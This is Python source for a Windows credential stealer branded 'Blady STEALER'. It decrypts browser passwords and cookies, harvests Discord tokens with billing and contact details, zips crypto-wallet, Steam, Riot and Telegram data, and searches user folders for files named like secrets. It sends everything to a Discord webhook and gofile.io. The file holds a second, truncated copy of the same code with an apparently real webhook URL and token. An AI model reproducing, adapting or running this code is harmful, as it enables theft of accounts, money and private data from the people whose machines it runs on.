import os
from builtins import *
from math import prod as Frame
import sys, string, os
import requests
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import requests
import subprocess
import urllib.request
import tempfile
import subprocess
import base64

#  THIS IS 1.0 VERSION
#
hook = "PASTE_YOUR_HOOK"
DETECTED = False

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass
def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    # print(globalinfo)
    return globalinfo


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "            
    return billing



def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False


def uploadToken(token, path):
    global hook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == '': friends = "No Rare Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"

    data = {
        "content": f'{globalInfo()} | Found in `{path}`',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                    "name": ":rocket: Token:",
                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
                },
                {
                    "name": ":envelope: Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": ":mobile_phone: Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": ":globe_with_meridians: IP:",
                    "value": f"`{getip()}`",
                    "inline": True
                },
                {
                    "name": ":beginner: Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": ":credit_card: Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": ":clown: HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "@Blady STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
        "username": "Blady Stealer",
        "attachments": []
        }
    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "wpcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": globalInfo(),
            "embeds": [
                {
                    "title": "Blady | Cookies Stealer",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [w4spCookies.txt]({link})",
                    "color": 14406413,
                    "footer": {
                        "text": "@Blady STEALER",
                        "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
                    }
                }
            ],
            "username": "Blady",
            "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return
    if name == "wppassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": globalInfo(),
            "embeds": [
                {
                    "title": "Blady | Password Stealer",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [w4spPassword.txt]({link})",
                    "color": 14406413,
                    "footer": {
                        "text": "@Blady STEALER",
                        "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
                    }
                }
            ],
            "username": "Blady",
            "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": globalInfo(),
            "embeds": [
                {
                "color": 14406413,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Blady | File Stealer"
                },
                "footer": {
                    "text": "@Blady STEALER",
                    "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
                }
                }
            ],
            "username": "Blady",
            "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return



# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Blady STEALER ON TOP-->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                uploadToken(token, path)

Passw = []
def getPassw(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'passw')

Cookies = []    
def getCookie(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
            CookiCount += 1
    writeforfile(Cookies, 'cook')

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            uploadToken(tokenDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Blady Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 15781403,
            "footer": {
                "text": "@Blady STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
            }
            }
        ],
        "username": "Blady Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
        "attachments": []
    }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    # for patt in browserPaths:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
    
    # for patt in PathsToZip:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
    
    # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False
def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret"

    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)
    import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import requests
import subprocess
import urllib.request
import tempfile
import subprocess
import base64

#  THIS IS 1.0 VERSION
#
# 
hook = "https://discord.com/api/webhooks/1041273034465607710/lWCJ-Az7r1F_gNYScXuUZekR9dZuOz-bgYIfuCU7J-3S-3Pzu47SgbGCkP1PH-KJ9Ham"
DETECTED = False

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
